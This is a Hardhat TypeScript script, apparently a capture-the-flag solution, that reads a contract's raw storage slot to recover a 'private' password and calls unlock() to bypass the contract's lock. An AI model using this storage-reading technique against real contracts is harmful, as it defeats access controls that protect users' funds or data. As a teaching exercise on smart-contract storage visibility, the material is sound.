// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
// When running the script with `hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { parseEther, parseUnits } from 'ethers/lib/utils';
import { ethers } from 'hardhat';


async function main(): Promise<void> {
  // Hardhat always runs the compile task when running scripts through it.
  // If this runs in a standalone fashion you may want to call compile manually
  // to make sure everything is compiled
  // await run("compile");
  // We get the contract to deploy
  const [deployer] = await ethers.getSigners();
  const privacyAddress = "0x54Ff09e5A30f970c8bA24347cd6D4d01522bfAa0"
  console.log(deployer.address);

  const privacyFactory = await ethers.getContractFactory("Privacy");
  const privacy = privacyFactory.attach(privacyAddress)
  console.log('privacy deployed to: ', privacy.address);

  // the password is stored in the second storage slot
  /*
  for (let i=0; i <= 10; i ++) {
    console.log((await ethers.provider.getStorageAt(privacyAddress, i)))
  }
  */
  
  console.log((await privacy.locked()))

  const data = await ethers.provider.getStorageAt(privacyAddress, 5);
  var key = data.slice(2, 34);
  const tx = await privacy.unlock(data.slice(0, 34));
  console.log(tx)
  const receipt = await tx.wait()
  console.log(receipt)
  
  console.log((await privacy.locked()))
} 

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error: Error) => {
    console.error(error);
    process.exit(1);
  });
